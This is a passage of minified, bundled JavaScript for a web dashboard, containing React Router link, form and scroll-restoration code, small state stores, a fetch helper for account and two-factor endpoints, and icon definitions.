  return e.reduce((e, i) => {
    if (t && !sn(i) && i.as === `script` && i.href && r.has(i.href)) return e;
    let a = JSON.stringify(pn(i));
    return (n.has(a) || (n.add(a), e.push({ key: a, link: i })), e);
  }, []);
}
function hn() {
  let e = _.useContext(Ve);
  return (
    rn(
      e,
      `You must render this element inside a <DataRouterContext.Provider> element`,
    ),
    e
  );
}
function gn() {
  let e = _.useContext(He);
  return (
    rn(
      e,
      `You must render this element inside a <DataRouterStateContext.Provider> element`,
    ),
    e
  );
}
var _n = _.createContext(void 0);
_n.displayName = `FrameworkContext`;
function vn() {
  let e = _.useContext(_n);
  return (
    rn(e, `You must render this element inside a <HydratedRouter> element`),
    e
  );
}
function yn(e, t) {
  let n = _.useContext(_n),
    [r, i] = _.useState(!1),
    [a, o] = _.useState(!1),
    {
      onFocus: s,
      onBlur: c,
      onMouseEnter: l,
      onMouseLeave: u,
      onTouchStart: d,
    } = t,
    f = _.useRef(null);
  (_.useEffect(() => {
    if ((e === `render` && o(!0), e === `viewport`)) {
      let e = new IntersectionObserver(
        (e) => {
          e.forEach((e) => {
            o(e.isIntersecting);
          });
        },
        { threshold: 0.5 },
      );
      return (
        f.current && e.observe(f.current),
        () => {
          e.disconnect();
        }
      );
    }
  }, [e]),
    _.useEffect(() => {
      if (r) {
        let e = setTimeout(() => {
          o(!0);
        }, 100);
        return () => {
          clearTimeout(e);
        };
      }
    }, [r]));
  let p = () => {
      i(!0);
    },
    m = () => {
      (i(!1), o(!1));
    };
  return n
    ? e === `intent`
      ? [
          a,
          f,
          {
            onFocus: bn(s, p),
            onBlur: bn(c, m),
            onMouseEnter: bn(l, p),
            onMouseLeave: bn(u, m),
            onTouchStart: bn(d, p),
          },
        ]
      : [a, f, {}]
    : [!1, f, {}];
}
function bn(e, t) {
  return (n) => {
    (e && e(n), n.defaultPrevented || t(n));
  };
}
function xn({ page: e, ...t }) {
  let n = We(),
    { router: r } = hn(),
    i = _.useMemo(() => ae(r.routes, e, r.basename), [r.routes, e, r.basename]);
  return i
    ? n
      ? _.createElement(Cn, { page: e, matches: i, ...t })
      : _.createElement(wn, { page: e, matches: i, ...t })
    : null;
}
function Sn(e) {
  let { manifest: t, routeModules: n } = vn(),
    [r, i] = _.useState([]);
  return (
    _.useEffect(() => {
      let r = !1;
      return (
        ln(e, t, n).then((e) => {
          r || i(e);
        }),
        () => {
          r = !0;
        }
      );
    }, [e, t, n]),
    r
  );
}
function Cn({ page: e, matches: t, ...n }) {
  let r = at(),
    { future: i } = vn(),
    { basename: a } = hn(),
    o = _.useMemo(() => {
      if (e === r.pathname + r.search + r.hash) return [];
      let n = an(e, a, i.unstable_trailingSlashAwareDataRequests, `rsc`),
        o = !1,
        s = [];
      for (let e of t)
        typeof e.route.shouldRevalidate == `function`
          ? (o = !0)
          : s.push(e.route.id);
      return (
        o && s.length > 0 && n.searchParams.set(`_routes`, s.join(`,`)),
        [n.pathname + n.search]
      );
    }, [a, i.unstable_trailingSlashAwareDataRequests, e, r, t]);
  return _.createElement(
    _.Fragment,
    null,
    o.map((e) =>
      _.createElement(`link`, {
        key: e,
        rel: `prefetch`,
        as: `fetch`,
        href: e,
        ...n,
      }),
    ),
  );
}
function wn({ page: e, matches: t, ...n }) {
  let r = at(),
    { future: i, manifest: a, routeModules: o } = vn(),
    { basename: s } = hn(),
    { loaderData: c, matches: l } = gn(),
    u = _.useMemo(() => un(e, t, l, a, r, `data`), [e, t, l, a, r]),
    d = _.useMemo(() => un(e, t, l, a, r, `assets`), [e, t, l, a, r]),
    f = _.useMemo(() => {
      if (e === r.pathname + r.search + r.hash) return [];
      let n = new Set(),
        l = !1;
      if (
        (t.forEach((e) => {
          let t = a.routes[e.route.id];
          !t ||
            !t.hasLoader ||
            ((!u.some((t) => t.route.id === e.route.id) &&
              e.route.id in c &&
              o[e.route.id]?.shouldRevalidate) ||
            t.hasClientLoader
              ? (l = !0)
              : n.add(e.route.id));
        }),
        n.size === 0)
      )
        return [];
      let d = an(e, s, i.unstable_trailingSlashAwareDataRequests, `data`);
      return (
        l &&
          n.size > 0 &&
          d.searchParams.set(
            `_routes`,
            t
              .filter((e) => n.has(e.route.id))
              .map((e) => e.route.id)
              .join(`,`),
          ),
        [d.pathname + d.search]
      );
    }, [s, i.unstable_trailingSlashAwareDataRequests, c, r, a, u, t, e, o]),
    p = _.useMemo(() => dn(d, a), [d, a]),
    m = Sn(d);
  return _.createElement(
    _.Fragment,
    null,
    f.map((e) =>
      _.createElement(`link`, {
        key: e,
        rel: `prefetch`,
        as: `fetch`,
        href: e,
        ...n,
      }),
    ),
    p.map((e) =>
      _.createElement(`link`, { key: e, rel: `modulepreload`, href: e, ...n }),
    ),
    m.map(({ key: e, link: t }) =>
      _.createElement(`link`, {
        key: e,
        nonce: n.nonce,
        ...t,
        crossOrigin: t.crossOrigin ?? n.crossOrigin,
      }),
    ),
  );
}
function Tn(...e) {
  return (t) => {
    e.forEach((e) => {
      typeof e == `function` ? e(t) : e != null && (e.current = t);
    });
  };
}
_.Component;
var En =
  typeof window < `u` &&
  window.document !== void 0 &&
  window.document.createElement !== void 0;
try {
  En && (window.__reactRouterVersion = `7.14.1`);
} catch {}
function Dn({
  basename: e,
  children: t,
  unstable_useTransitions: n,
  window: r,
}) {
  let i = _.useRef();
  i.current ??= ee({ window: r, v5Compat: !0 });
  let a = i.current,
    [o, s] = _.useState({ action: a.action, location: a.location }),
    c = _.useCallback(
      (e) => {
        n === !1 ? s(e) : _.startTransition(() => s(e));
      },
      [n],
    );
  return (
    _.useLayoutEffect(() => a.listen(c), [a, c]),
    _.createElement(Rt, {
      basename: e,
      children: t,
      location: o.location,
      navigationType: o.action,
      navigator: a,
      unstable_useTransitions: n,
    })
  );
}
function On({
  basename: e,
  children: t,
  history: n,
  unstable_useTransitions: r,
}) {
  let [i, a] = _.useState({ action: n.action, location: n.location }),
    o = _.useCallback(
      (e) => {
        r === !1 ? a(e) : _.startTransition(() => a(e));
      },
      [r],
    );
  return (
    _.useLayoutEffect(() => n.listen(o), [n, o]),
    _.createElement(Rt, {
      basename: e,
      children: t,
      location: i.location,
      navigationType: i.action,
      navigator: n,
      unstable_useTransitions: r,
    })
  );
}
On.displayName = `unstable_HistoryRouter`;
var kn = /^(?:[a-z][a-z0-9+.-]*:|\/\/)/i,
  An = _.forwardRef(function (
    {
      onClick: e,
      discover: t = `render`,
      prefetch: n = `none`,
      relative: r,
      reloadDocument: i,
      replace: a,
      unstable_mask: o,
      state: s,
      target: c,
      to: l,
      preventScrollReset: u,
      viewTransition: d,
      unstable_defaultShouldRevalidate: f,
      ...p
    },
    m,
  ) {
    let {
        basename: h,
        navigator: g,
        unstable_useTransitions: v,
      } = _.useContext(Je),
      y = typeof l == `string` && kn.test(l),
      b = Re(l, h);
    l = b.to;
    let x = rt(l, { relative: r }),
      S = at(),
      C = null;
    if (o) {
      let e = De(o, [], S.unstable_mask ? S.unstable_mask.pathname : `/`, !0);
      (h !== `/` && (e.pathname = e.pathname === `/` ? h : ke([h, e.pathname])),
        (C = g.createHref(e)));
    }
    let [w, ee, T] = yn(n, p),
      E = Ln(l, {
        replace: a,
        unstable_mask: o,
        state: s,
        target: c,
        preventScrollReset: u,
        relative: r,
        viewTransition: d,
        unstable_defaultShouldRevalidate: f,
        unstable_useTransitions: v,
      });
    function D(t) {
      (e && e(t), t.defaultPrevented || E(t));
    }
    let te = !(b.isExternal || i),
      ne = _.createElement(`a`, {
        ...p,
        ...T,
        href: (te ? C : void 0) || b.absoluteURL || x,
        onClick: te ? D : e,
        ref: Tn(m, ee),
        target: c,
        "data-discover": !y && t === `render` ? `true` : void 0,
      });
    return w && !y
      ? _.createElement(_.Fragment, null, ne, _.createElement(xn, { page: x }))
      : ne;
  });
An.displayName = `Link`;
var jn = _.forwardRef(function (
  {
    "aria-current": e = `page`,
    caseSensitive: t = !1,
    className: n = ``,
    end: r = !1,
    style: i,
    to: a,
    viewTransition: o,
    children: s,
    ...c
  },
  l,
) {
  let u = ft(a, { relative: c.relative }),
    d = at(),
    f = _.useContext(He),
    { navigator: p, basename: m } = _.useContext(Je),
    h = f != null && qn(u) && o === !0,
    g = p.encodeLocation ? p.encodeLocation(u).pathname : u.pathname,
    v = d.pathname,
    y =
      f && f.navigation && f.navigation.location
        ? f.navigation.location.pathname
        : null;
  (t ||
    ((v = v.toLowerCase()),
    (y = y ? y.toLowerCase() : null),
    (g = g.toLowerCase())),
    y && m && (y = be(y, m) || y));
  let b = g !== `/` && g.endsWith(`/`) ? g.length - 1 : g.length,
    x = v === g || (!r && v.startsWith(g) && v.charAt(b) === `/`),
    S =
      y != null &&
      (y === g || (!r && y.startsWith(g) && y.charAt(g.length) === `/`)),
    C = { isActive: x, isPending: S, isTransitioning: h },
    w = x ? e : void 0,
    ee;
  ee =
    typeof n == `function`
      ? n(C)
      : [
          n,
          x ? `active` : null,
          S ? `pending` : null,
          h ? `transitioning` : null,
        ]
          .filter(Boolean)
          .join(` `);
  let T = typeof i == `function` ? i(C) : i;
  return _.createElement(
    An,
    {
      ...c,
      "aria-current": w,
      className: ee,
      ref: l,
      style: T,
      to: a,
      viewTransition: o,
    },
    typeof s == `function` ? s(C) : s,
  );
});
jn.displayName = `NavLink`;
var Mn = _.forwardRef(
  (
    {
      discover: e = `render`,
      fetcherKey: t,
      navigate: n,
      reloadDocument: r,
      replace: i,
      state: a,
      method: o = Vt,
      action: s,
      onSubmit: c,
      relative: l,
      preventScrollReset: u,
      viewTransition: d,
      unstable_defaultShouldRevalidate: f,
      ...p
    },
    m,
  ) => {
    let { unstable_useTransitions: h } = _.useContext(Je),
      g = Bn(),
      v = Vn(s, { relative: l }),
      y = o.toLowerCase() === `get` ? `get` : `post`,
      b = typeof s == `string` && kn.test(s);
    return _.createElement(`form`, {
      ref: m,
      method: y,
      action: v,
      onSubmit: r
        ? c
        : (e) => {
            if ((c && c(e), e.defaultPrevented)) return;
            e.preventDefault();
            let r = e.nativeEvent.submitter,
              s = r?.getAttribute(`formmethod`) || o,
              p = () =>
                g(r || e.currentTarget, {
                  fetcherKey: t,
                  method: s,
                  navigate: n,
                  replace: i,
                  state: a,
                  relative: l,
                  preventScrollReset: u,
                  viewTransition: d,
                  unstable_defaultShouldRevalidate: f,
                });
            h && n !== !1 ? _.startTransition(() => p()) : p();
          },
      ...p,
      "data-discover": !b && e === `render` ? `true` : void 0,
    });
  },
);
Mn.displayName = `Form`;
function Nn({ getKey: e, storageKey: t, ...n }) {
  let r = _.useContext(_n),
    { basename: i } = _.useContext(Je),
    a = at(),
    o = kt();
  Gn({ getKey: e, storageKey: t });
  let s = _.useMemo(() => {
    if (!r || !e) return null;
    let t = Wn(a, o, i, e);
    return t === a.key ? null : t;
  }, []);
  if (!r || r.isSpaMode) return null;
  let c = ((e, t) => {
    if (!window.history.state || !window.history.state.key) {
      let e = Math.random().toString(32).slice(2);
      window.history.replaceState({ key: e }, ``);
    }
    try {
      let n = JSON.parse(sessionStorage.getItem(e) || `{}`)[
        t || window.history.state.key
      ];
      typeof n == `number` && window.scrollTo(0, n);
    } catch (t) {
      (console.error(t), sessionStorage.removeItem(e));
    }
  }).toString();
  return _.createElement(`script`, {
    ...n,
    suppressHydrationWarning: !0,
    dangerouslySetInnerHTML: {
      __html: `(${c})(${nn(JSON.stringify(t || Hn))}, ${nn(JSON.stringify(s))})`,
    },
  });
}
Nn.displayName = `ScrollRestoration`;
function Pn(e) {
  return `${e} must be used within a data router.  See https://reactrouter.com/en/main/routers/picking-a-router.`;
}
function Fn(e) {
  let t = _.useContext(Ve);
  return (T(t, Pn(e)), t);
}
function In(e) {
  let t = _.useContext(He);
  return (T(t, Pn(e)), t);
}
function Ln(
  e,
  {
    target: t,
    replace: n,
    unstable_mask: r,
    state: i,
    preventScrollReset: a,
    relative: o,
    viewTransition: s,
    unstable_defaultShouldRevalidate: c,
    unstable_useTransitions: l,
  } = {},
) {
  let u = ct(),
    d = at(),
    f = ft(e, { relative: o });
  return _.useCallback(
    (p) => {
      if (Jt(p, t)) {
        p.preventDefault();
        let t = n === void 0 ? O(d) === O(f) : n,
          m = () =>
            u(e, {
              replace: t,
              unstable_mask: r,
              state: i,
              preventScrollReset: a,
              relative: o,
              viewTransition: s,
              unstable_defaultShouldRevalidate: c,
            });
        l ? _.startTransition(() => m()) : m();
      }
    },
    [d, u, f, n, r, i, t, e, a, o, s, c, l],
  );
}
var Rn = 0,
  zn = () => `__${String(++Rn)}__`;
function Bn() {
  let { router: e } = Fn(`useSubmit`),
    { basename: t } = _.useContext(Je),
    n = Dt(),
    r = e.fetch,
    i = e.navigate;
  return _.useCallback(
    async (e, a = {}) => {
      let { action: o, method: s, encType: c, formData: l, body: u } = $t(e, t);
      a.navigate === !1
        ? await r(a.fetcherKey || zn(), n, a.action || o, {
            unstable_defaultShouldRevalidate:
              a.unstable_defaultShouldRevalidate,
            preventScrollReset: a.preventScrollReset,
            formData: l,
            body: u,
            formMethod: a.method || s,
            formEncType: a.encType || c,
            flushSync: a.flushSync,
          })
        : await i(a.action || o, {
            unstable_defaultShouldRevalidate:
              a.unstable_defaultShouldRevalidate,
            preventScrollReset: a.preventScrollReset,
            formData: l,
            body: u,
            formMethod: a.method || s,
            formEncType: a.encType || c,
            replace: a.replace,
            state: a.state,
            fromRouteId: n,
            flushSync: a.flushSync,
            viewTransition: a.viewTransition,
          });
    },
    [r, i, t, n],
  );
}
function Vn(e, { relative: t } = {}) {
  let { basename: n } = _.useContext(Je),
    r = _.useContext(Xe);
  T(r, `useFormAction must be used inside a RouteContext`);
  let [i] = r.matches.slice(-1),
    a = { ...ft(e || `.`, { relative: t }) },
    o = at();
  if (e == null) {
    a.search = o.search;
    let e = new URLSearchParams(a.search),
      t = e.getAll(`index`);
    if (t.some((e) => e === ``)) {
      (e.delete(`index`),
        t.filter((e) => e).forEach((t) => e.append(`index`, t)));
      let n = e.toString();
      a.search = n ? `?${n}` : ``;
    }
  }
  return (
    (!e || e === `.`) &&
      i.route.index &&
      (a.search = a.search ? a.search.replace(/^\?/, `?index&`) : `?index`),
    n !== `/` && (a.pathname = a.pathname === `/` ? n : ke([n, a.pathname])),
    O(a)
  );
}
var Hn = `react-router-scroll-positions`,
  Un = {};
function Wn(e, t, n, r) {
  let i = null;
  return (
    r &&
      (i = r(
        n === `/` ? e : { ...e, pathname: be(e.pathname, n) || e.pathname },
        t,
      )),
    (i ??= e.key),
    i
  );
}
function Gn({ getKey: e, storageKey: t } = {}) {
  let { router: n } = Fn(`useScrollRestoration`),
    { restoreScrollPosition: r, preventScrollReset: i } =
      In(`useScrollRestoration`),
    { basename: a } = _.useContext(Je),
    o = at(),
    s = kt(),
    c = Ot();
  (_.useEffect(
    () => (
      (window.history.scrollRestoration = `manual`),
      () => {
        window.history.scrollRestoration = `auto`;
      }
    ),
    [],
  ),
    Kn(
      _.useCallback(() => {
        if (c.state === `idle`) {
          let t = Wn(o, s, a, e);
          Un[t] = window.scrollY;
        }
        try {
          sessionStorage.setItem(t || Hn, JSON.stringify(Un));
        } catch (e) {
          E(
            !1,
            `Failed to save scroll positions in sessionStorage, <ScrollRestoration /> will not work properly (${e}).`,
          );
        }
        window.history.scrollRestoration = `auto`;
      }, [c.state, e, a, o, s, t]),
    ),
    typeof document < `u` &&
      (_.useLayoutEffect(() => {
        try {
          let e = sessionStorage.getItem(t || Hn);
          e && (Un = JSON.parse(e));
        } catch {}
      }, [t]),
      _.useLayoutEffect(() => {
        let t = n?.enableScrollRestoration(
          Un,
          () => window.scrollY,
          e ? (t, n) => Wn(t, n, a, e) : void 0,
        );
        return () => t && t();
      }, [n, a, e]),
      _.useLayoutEffect(() => {
        if (r !== !1) {
          if (typeof r == `number`) {
            window.scrollTo(0, r);
            return;
          }
          try {
            if (o.hash) {
              let e = document.getElementById(
                decodeURIComponent(o.hash.slice(1)),
              );
              if (e) {
                e.scrollIntoView();
                return;
              }
            }
          } catch {
            E(
              !1,
              `"${o.hash.slice(1)}" is not a decodable element ID. The view will not scroll to it.`,
            );
          }
          i !== !0 && window.scrollTo(0, 0);
        }
      }, [o, r, i])));
}
function Kn(e, t) {
  let { capture: n } = t || {};
  _.useEffect(() => {
    let t = n == null ? void 0 : { capture: n };
    return (
      window.addEventListener(`pagehide`, e, t),
      () => {
        window.removeEventListener(`pagehide`, e, t);
      }
    );
  }, [e, n]);
}
function qn(e, { relative: t } = {}) {
  let n = _.useContext(Ge);
  T(
    n != null,
    "`useViewTransitionState` must be used within `react-router-dom`'s `RouterProvider`.  Did you accidentally import `RouterProvider` from `react-router`?",
  );
  let { basename: r } = Fn(`useViewTransitionState`),
    i = ft(e, { relative: t });
  if (!n.isTransitioning) return !1;
  let a = be(n.currentLocation.pathname, r) || n.currentLocation.pathname,
    o = be(n.nextLocation.pathname, r) || n.nextLocation.pathname;
  return _e(i.pathname, o) != null || _e(i.pathname, a) != null;
}
var Jn = (e) => {
    let t,
      n = new Set(),
      r = (e, r) => {
        let i = typeof e == `function` ? e(t) : e;
        if (!Object.is(i, t)) {
          let e = t;
          ((t =
            (r ?? (typeof i != `object` || !i)) ? i : Object.assign({}, t, i)),
            n.forEach((n) => n(t, e)));
        }
      },
      i = () => t,
      a = {
        setState: r,
        getState: i,
        getInitialState: () => o,
        subscribe: (e) => (n.add(e), () => n.delete(e)),
      },
      o = (t = e(r, i, a));
    return a;
  },
  Yn = (e) => (e ? Jn(e) : Jn),
  Xn = (e) => e;
function Zn(e, t = Xn) {
  let n = _.useSyncExternalStore(
    e.subscribe,
    _.useCallback(() => t(e.getState()), [e, t]),
    _.useCallback(() => t(e.getInitialState()), [e, t]),
  );
  return (_.useDebugValue(n), n);
}
var Qn = (e) => {
    let t = Yn(e),
      n = (e) => Zn(t, e);
    return (Object.assign(n, t), n);
  },
  $n = (e) => (e ? Qn(e) : Qn),
  er = $n((e) => ({
    user: null,
    loading: !0,
    setUser: (t) => e({ user: t, loading: !1 }),
    setLoading: (t) => e({ loading: t }),
    logout: () => {
      (e({ user: null, loading: !1 }), (window.location.href = `/logout`));
    },
  })),
  tr = {
    panel_name: `PANEL`,
    panel_logo: ``,
    primary_color: ``,
    accent_color: ``,
    theme: `default`,
  };
function nr(e) {
  let t = document.documentElement.style;
  e.primary_color && t.setProperty(`--color-accent`, e.primary_color);
}
var rr = $n((e) => ({
    branding: tr,
    loaded: !1,
    fetchBranding: async () => {
      try {
        let t = await fetch(`/dash/branding`, { credentials: `include` });
        if (!t.ok) return;
        let n = await t.json(),
          r = { ...tr, ...n };
        (nr(r), e({ branding: r, loaded: !0 }));
      } catch {
        e({ loaded: !0 });
      }
    },
  })),
  ir = ``;
async function P(e, t = {}) {
  try {
    let n = await fetch(`${ir}${e}`, {
      credentials: `include`,
      headers: { "Content-Type": `application/json`, ...t.headers },
      ...t,
    });
    // if (n.status === 401 || n.status === 403) throw Error(`Unauthorized`);
    // if (n.redirected && n.url.includes(`/login`)) throw Error(`Session expired`);
    // if (!n.ok) {
    //   let e = await n.json().catch(() => ({ error: n.statusText }));
    //   throw Error(e.error || `HTTP ${n.status}`);
    // }
    let r = await n.text();
    if (!r) return {};
    return JSON.parse(r);
  } catch {
    console.log("error from here", e);
    // throw Error(`Invalid response`);
  }
}
async function ar() {
  return P(`/dash/me`);
}
async function or(e) {
  return P(`/dash/me/update`, { method: `POST`, body: JSON.stringify(e) });
}
async function sr() {
  return P(`/dash/me/referral`);
}
async function cr() {
  return P(`/dash/me/2fa/setup`, { method: `POST` });
}
async function lr(e) {
  return P(`/dash/me/2fa/verify`, {
    method: `POST`,
    body: JSON.stringify({ code: e }),
  });
}
async function ur(e) {
  return P(`/dash/me/2fa/disable`, {
    method: `POST`,
    body: JSON.stringify({ password: e }),
  });
}
function dr(e) {
  (e === `dark`
    ? document.documentElement.classList.add(`dark`)
    : document.documentElement.classList.remove(`dark`),
    localStorage.setItem(`theme`, e));
}
var fr = localStorage.getItem(`theme`) || `light`;
dr(fr);
var pr = $n((e) => ({
    theme: fr,
    toggle: () =>
      e((e) => {
        let t = e.theme === `light` ? `dark` : `light`;
        return (dr(t), { theme: t });
      }),
    setTheme: (t) => e(() => (dr(t), { theme: t })),
  })),
  mr = (...e) =>
    e
      .filter((e, t, n) => !!e && e.trim() !== `` && n.indexOf(e) === t)
      .join(` `)
      .trim(),
  hr = (e) => e.replace(/([a-z0-9])([A-Z])/g, `$1-$2`).toLowerCase(),
  gr = (e) =>
    e.replace(/^([A-Z])|[\s-_]+(\w)/g, (e, t, n) =>
      n ? n.toUpperCase() : t.toLowerCase(),
    ),
  _r = (e) => {
    let t = gr(e);
    return t.charAt(0).toUpperCase() + t.slice(1);
  },
  vr = {
    xmlns: `http://www.w3.org/2000/svg`,
    width: 24,
    height: 24,
    viewBox: `0 0 24 24`,
    fill: `none`,
    stroke: `currentColor`,
    strokeWidth: 2,
    strokeLinecap: `round`,
    strokeLinejoin: `round`,
  },
  yr = (e) => {
    for (let t in e)
      if (t.startsWith(`aria-`) || t === `role` || t === `title`) return !0;
    return !1;
  },
  br = (0, _.createContext)({}),
  xr = () => (0, _.useContext)(br),
  Sr = (0, _.forwardRef)(
    (
      {
        color: e,
        size: t,
        strokeWidth: n,
        absoluteStrokeWidth: r,
        className: i = ``,
        children: a,
        iconNode: o,
        ...s
      },
      c,
    ) => {
      let {
          size: l = 24,
          strokeWidth: u = 2,
          absoluteStrokeWidth: d = !1,
          color: f = `currentColor`,
          className: p = ``,
        } = xr() ?? {},
        m = (r ?? d) ? (Number(n ?? u) * 24) / Number(t ?? l) : (n ?? u);
      return (0, _.createElement)(
        `svg`,
        {
          ref: c,
          ...vr,
          width: t ?? l ?? vr.width,
          height: t ?? l ?? vr.height,
          stroke: e ?? f,
          strokeWidth: m,
          className: mr(`lucide`, p, i),
          ...(!a && !yr(s) && { "aria-hidden": `true` }),
          ...s,
        },
        [
          ...o.map(([e, t]) => (0, _.createElement)(e, t)),
          ...(Array.isArray(a) ? a : [a]),
        ],
      );
    },
  ),
  F = (e, t) => {
    let n = (0, _.forwardRef)(({ className: n, ...r }, i) =>
      (0, _.createElement)(Sr, {
        ref: i,
        iconNode: t,
        className: mr(`lucide-${hr(_r(e))}`, `lucide-${e}`, n),
        ...r,
      }),
    );
    return ((n.displayName = _r(e)), n);
  },
  Cr = F(`activity`, [
    [
      `path`,
      {
        d: `M22 12h-2.48a2 2 0 0 0-1.93 1.46l-2.35 8.36a.25.25 0 0 1-.48 0L9.24 2.18a.25.25 0 0 0-.48 0l-2.35 8.36A2 2 0 0 1 4.49 12H2`,
        key: `169zse`,
      },
    ],
  ]),
  wr = F(`apple`, [
    [`path`, { d: `M12 6.528V3a1 1 0 0 1 1-1h0`, key: `11qiee` }],
    [
      `path`,
      {
        d: `M18.237 21A15 15 0 0 0 22 11a6 6 0 0 0-10-4.472A6 6 0 0 0 2 11a15.1 15.1 0 0 0 3.763 10 3 3 0 0 0 3.648.648 5.5 5.5 0 0 1 5.178 0A3 3 0 0 0 18.237 21`,
        key: `110c12`,
      },
    ],
  ]),
  Tr = F(`arrow-right`, [
    [`path`, { d: `M5 12h14`, key: `1ays0h` }],
    [`path`, { d: `m12 5 7 7-7 7`, key: `xquz4c` }],
  ]),
  Er = F(`at-sign`, [
    [`circle`, { cx: `12`, cy: `12`, r: `4`, key: `4exip2` }],
    [`path`, { d: `M16 8v5a3 3 0 0 0 6 0v-1a10 10 0 1 0-4 8`, key: `7n84p3` }],
  ]),
  Dr = F(`bell`, [
    [`path`, { d: `M10.268 21a2 2 0 0 0 3.464 0`, key: `vwvbt9` }],
    [
      `path`,
      {
        d: `M3.262 15.326A1 1 0 0 0 4 17h16a1 1 0 0 0 .74-1.673C19.41 13.956 18 12.499 18 8A6 6 0 0 0 6 8c0 4.499-1.411 5.956-2.738 7.326`,
        key: `11g9vi`,
      },
    ],
  ]),
  Or = F(`book-open`, [
    [`path`, { d: `M12 7v14`, key: `1akyts` }],
    [
      `path`,
      {
        d: `M3 18a1 1 0 0 1-1-1V4a1 1 0 0 1 1-1h5a4 4 0 0 1 4 4 4 4 0 0 1 4-4h5a1 1 0 0 1 1 1v13a1 1 0 0 1-1 1h-6a3 3 0 0 0-3 3 3 3 0 0 0-3-3z`,
        key: `ruj8y`,
      },
    ],
  ]),
  kr = F(`building-2`, [
    [`path`, { d: `M10 12h4`, key: `a56b0p` }],
    [`path`, { d: `M10 8h4`, key: `1sr2af` }],
    [`path`, { d: `M14 21v-3a2 2 0 0 0-4 0v3`, key: `1rgiei` }],
    [
      `path`,
      {
        d: `M6 10H4a2 2 0 0 0-2 2v7a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-2`,
        key: `secmi2`,
      },
    ],
    [`path`, { d: `M6 21V5a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v16`, key: `16ra0t` }],
  ]),
  Ar = F(`calendar-plus`, [
    [`path`, { d: `M16 19h6`, key: `xwg31i` }],
    [`path`, { d: `M16 2v4`, key: `4m81vk` }],
    [`path`, { d: `M19 16v6`, key: `tddt3s` }],
    [
      `path`,
      {
        d: `M21 12.598V6a2 2 0 0 0-2-2H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h8.5`,
        key: `1glfrc`,
      },
    ],
    [`path`, { d: `M3 10h18`, key: `8toen8` }],
    [`path`, { d: `M8 2v4`, key: `1cmpym` }],
  ]),
  jr = F(`check`, [[`path`, { d: `M20 6 9 17l-5-5`, key: `1gmf2c` }]]),
  Mr = F(`chevron-down`, [[`path`, { d: `m6 9 6 6 6-6`, key: `qrunsl` }]]),
  Nr = F(`chevron-right`, [[`path`, { d: `m9 18 6-6-6-6`, key: `mthhwq` }]]),
  Pr = F(`chevron-up`, [[`path`, { d: `m18 15-6-6-6 6`, key: `153udz` }]]),
  Fr = F(`circle-alert`, [
    [`circle`, { cx: `12`, cy: `12`, r: `10`, key: `1mglay` }],
    [`line`, { x1: `12`, x2: `12`, y1: `8`, y2: `12`, key: `1pkeuh` }],
    [`line`, { x1: `12`, x2: `12.01`, y1: `16`, y2: `16`, key: `4dfq90` }],
  ]),
  Ir = F(`circle-check-big`, [
    [`path`, { d: `M21.801 10A10 10 0 1 1 17 3.335`, key: `yps3ct` }],
    [`path`, { d: `m9 11 3 3L22 4`, key: `1pflzl` }],
  ]),
  Lr = F(`circle-question-mark`, [
    [`circle`, { cx: `12`, cy: `12`, r: `10`, key: `1mglay` }],
    [`path`, { d: `M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3`, key: `1u773s` }],
    [`path`, { d: `M12 17h.01`, key: `p32p05` }],
  ]),
  Rr = F(`circle-x`, [
    [`circle`, { cx: `12`, cy: `12`, r: `10`, key: `1mglay` }],
    [`path`, { d: `m15 9-6 6`, key: `1uzhvr` }],
    [`path`, { d: `m9 9 6 6`, key: `z0biqf` }],
  ]),
  zr = F(`clock`, [
    [`circle`, { cx: `12`, cy: `12`, r: `10`, key: `1mglay` }],
    [`path`, { d: `M12 6v6l4 2`, key: `mmk7yg` }],
  ]),
  Br = F(`cloud`, [
    [
      `path`,
      {
        d: `M17.5 19H9a7 7 0 1 1 6.71-9h1.79a4.5 4.5 0 1 1 0 9Z`,
        key: `p7xjir`,
      },
    ],
  ]),
  Vr = F(`code`, [
    [`path`, { d: `m16 18 6-6-6-6`, key: `eg8j8` }],
    [`path`, { d: `m8 6-6 6 6 6`, key: `ppft3o` }],
  ]),
  Hr = F(`cookie`, [
    [
      `path`,
      {
        d: `M12 2a10 10 0 1 0 10 10 4 4 0 0 1-5-5 4 4 0 0 1-5-5`,
        key: `laymnq`,
      },
    ],
    [`path`, { d: `M8.5 8.5v.01`, key: `ue8clq` }],
    [`path`, { d: `M16 15.5v.01`, key: `14dtrp` }],
    [`path`, { d: `M12 12v.01`, key: `u5ubse` }],
    [`path`, { d: `M11 17v.01`, key: `1hyl5a` }],
    [`path`, { d: `M7 14v.01`, key: `uct60s` }],
  ]),
  Ur = F(`copy`, [
    [
      `rect`,
      {
        width: `14`,
        height: `14`,
        x: `8`,
        y: `8`,
        rx: `2`,
        ry: `2`,
        key: `17jyea`,
      },
    ],
    [
      `path`,
      {
        d: `M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2`,
        key: `zix9uf`,
      },
    ],
  ]),
  Wr = F(`dollar-sign`, [
    [`line`, { x1: `12`, x2: `12`, y1: `2`, y2: `22`, key: `7eqyqh` }],
    [
      `path`,
      { d: `M17 5H9.5a3.5 3.5 0 0 0 0 7h5a3.5 3.5 0 0 1 0 7H6`, key: `1b0p4s` },
    ],
  ]),
  Gr = F(`download`, [
    [`path`, { d: `M12 15V3`, key: `m9g1x1` }],
    [`path`, { d: `M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4`, key: `ih7n3h` }],
    [`path`, { d: `m7 10 5 5 5-5`, key: `brsn70` }],
  ]),
  Kr = F(`external-link`, [
    [`path`, { d: `M15 3h6v6`, key: `1q9fwt` }],
    [`path`, { d: `M10 14 21 3`, key: `gplh6r` }],
    [
      `path`,
      {
        d: `M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6`,
        key: `a6xqqp`,
      },
    ],
  ]),
  qr = F(`eye-off`, [
    [
      `path`,
      {
        d: `M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49`,
        key: `ct8e1f`,
      },
    ],
    [`path`, { d: `M14.084 14.158a3 3 0 0 1-4.242-4.242`, key: `151rxh` }],
    [
      `path`,
      {
